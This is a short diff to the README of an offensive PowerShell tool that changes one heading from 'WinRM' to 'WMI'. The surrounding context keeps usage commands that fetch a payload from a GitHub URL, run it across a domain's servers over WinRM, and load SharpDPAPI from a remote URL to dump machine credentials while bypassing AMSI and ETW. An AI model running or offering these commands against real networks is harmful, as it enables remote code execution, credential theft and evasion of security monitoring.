@@ -63,7 +63,7 @@ PS C:\> $payload = New-PowerLoader -Type PoSh -FileUrl 'https://raw.githubuserco
 PS C:\> Invoke-PowerExec -ScriptBlock $payload -Method WinRM -ComputerDomain ADATUM.CORP -ComputerFilter Servers -Threads 10
 ```
 
-Run a .NET assembly through WinRM while bypassing AMSI and ETW:
+Run a .NET assembly through WMI while bypassing AMSI and ETW:
 
 ```
 PS C:\> $payload = New-PowerLoader -Type NetAsm -FileUrl 'https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/SharpDPAPI.exe' -ArgumentList 'machinecredentials' -Bypass ETW,AMSI
